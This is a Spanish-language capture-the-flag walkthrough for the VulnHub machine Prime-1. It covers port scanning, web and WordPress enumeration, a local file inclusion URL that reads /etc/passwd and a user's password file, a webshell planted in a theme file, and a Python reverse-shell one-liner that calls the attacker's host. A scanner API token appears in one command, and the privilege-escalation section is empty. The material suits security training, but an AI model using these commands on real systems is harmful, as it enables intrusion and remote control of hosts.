# PRIME-1
Desarrollo del CTF PRIME-1

## 2. Configuración de la VM

- Descargar la VM: https://www.vulnhub.com/entry/prime-1,358/

## 3. Escaneo de Puertos

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.142
Nmap scan report for 10.10.10.142
Host is up (0.00036s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HacknPentest
MAC Address: 00:0C:29:68:AF:BF (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime1.jpg" width=80% />


## 3. Enumeración

### 3.1. Enumeración HTTP

- Iniciamos la enumeración con GOBUSTER y/o DIRSEARCH

```
root@kali:~/PRIME_LEVEL1# python3 /root/dirsearch/dirsearch.py -u http://10.10.10.142/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/seclists/Discovery/Web-Content/big.txt --plain-text-report="tcp_80_http_dirsearch_big.txt"

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: txt, html, php, asp, aspx, jsp | HTTP method: GET | Threads: 16 | Wordlist size: 163783

Error Log: /root/dirsearch/logs/errors-21-03-19_21-58-07.log

Target: http://10.10.10.142/

Output File: /root/dirsearch/reports/10.10.10.142/_21-03-19_21-58-07.txt

[21:58:07] Starting: 
[21:58:07] 403 -  277B  - /.htaccess.asp
[21:58:07] 403 -  277B  - /.htaccess.php
[21:58:07] 403 -  277B  - /.htaccess.html
[21:58:07] 403 -  277B  - /.htaccess.jsp
[21:58:07] 403 -  277B  - /.htpasswd.html
[21:58:07] 403 -  277B  - /.htpasswd.php
[21:58:07] 403 -  277B  - /.htpasswd.asp
[21:58:07] 403 -  277B  - /.htaccess.aspx
[21:58:07] 403 -  277B  - /.htpasswd.aspx
[21:58:08] 403 -  277B  - /.htpasswd.txt
[21:58:08] 403 -  277B  - /.htpasswd.jsp
[21:59:31] 200 -  131B  - /dev
[22:00:21] 403 -  277B  - /icons/     (Added to queue)
[22:00:22] 200 -  147B  - /image.php
[22:00:25] 200 -  136B  - /index.php
[22:00:32] 301 -  317B  - /javascript  ->  http://10.10.10.142/javascript/     (Added to queue)
[22:00:32] 403 -  277B  - /javascript/
[22:01:59] 200 -  412B  - /secret.txt
[22:02:01] 403 -  277B  - /server-status
[22:02:01] 403 -  277B  - /server-status/     (Added to queue)
[22:02:50] 301 -  316B  - /wordpress  ->  http://10.10.10.142/wordpress/     (Added to queue)
[22:02:50] 200 -   11KB - /wordpress/
```

- Encontramos un archivo /DEV, un CMS /wordpress y un archivo secret.txt

<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime2.jpg" width=80% />

### 3.2. Seguimos las pistas 

- El archivo secret.txt indica lo siguiente: "haz fuzzing en cada página PHP y encuentra el parámetro correcto".
- Nos indican una herramienta para realizar el FUZZING. No es necesario utilizar la herramienta, el ejemplo que sale en la página es suficiente.

> Importante: La herramienta realiza FUZZING y prueba parámetros con el valor "SOMETHING"

<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime3.jpg" width=80% />

<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime4.jpg" width=80% />

- El nuevo mensaje nos dice: "utiliza el parámetro 'secrettier360' en alguna página PHP"
- Finalmente, encontramos un LFI y buscamos el archivo /etc/passwd

<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime5.jpg" width=80% />


### 3.3. Enumerando información de Wordpress

```
root@kali:~/PRIME_LEVEL1# wpscan --api-token EeAkkMHoWquqXoXdPtYLDPKBgIKRwsD57WSIoafBsXQ --url=http://10.10.10.142/wordpress/ -e ap,u --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.2
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.142/wordpress/ [10.10.10.142]
[+] Started: Fri Mar 19 22:25:17 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.142/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.10.142/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.10.142/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress theme in use: twentynineteen
 | Location: http://10.10.10.142/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://10.10.10.142/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://10.10.10.142/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.142/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:02:12 <======================================================================================> (92354 / 92354) 100.00% Time: 00:02:12
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.10.10.142/wordpress/wp-content/plugins/akismet/
 | Last Updated: 2021-03-02T18:10:00.000Z
 | Readme: http://10.10.10.142/wordpress/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.142/wordpress/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.1.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.142/wordpress/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.142/wordpress/wp-content/plugins/akismet/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <============================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] victor
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

```

- Identificamos el usuario: victor


## 4. Explotando la Vulnerabilidad

### 4.1. Explotando LFI

- Al arrancar la VM, obtenemos un mensaje que dice: "buscar el archivo password.txt"
- A través de LFI encontramos el archivo "password.txt" en la carpeta del usuario SAKET.

```
http://10.10.10.142/image.php?secrettier360=/home/saket/password.txt
```

<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime6.jpg" width=80% />

- Encontramos la palabra: follow_the_ippsec 

### 4.2. Accedemos a WORDPRESS

- Tenemos el usuario "victor" en Wordpress y tenemos el password: "follow_the_ippsec". Probemos el acceso.

<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime7.jpg" width=80% />

### 4.3. Subiendo WEBSHELL a través de Wordpress

- Existen diferentes maneras de subir una WEBSHELL:

1. Cargar un THEME con un webshell
2. Cargar un PLUGIN con un webshell
3. Editar un archivo de un THEME o PLUGIN y añadir un webshell

- Si intentamos cargar un THEME o PLUGIN, Wordpress nos indica que no tenemos permiso de escritura sobre la carpeta.
- Cuando buscamos editar algun THEME o PLUGIN aparece sólo un archivo que tiene permiso de escritura: SECRET.PHP

<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime8.jpg" width=80% />

- Ejecutamos el archivo secret.php y obtenemos SHELL.

```
http://10.10.10.142/wordpress/wp-content/themes/twentynineteen/secret.php?cmd=whoami
```

<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime9.jpg" width=80% />

```
/*En el navegador*/
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.133",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

/*En KALI*/
root@kali:~/PRIME_LEVEL1# netcat -lvp 443
Connection from 10.10.10.142:33650
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<img src="https://github.com/El-Palomo/PRIME-1/blob/main/prime10.jpg" width=80% />


## 5. Elevando Privilegios





















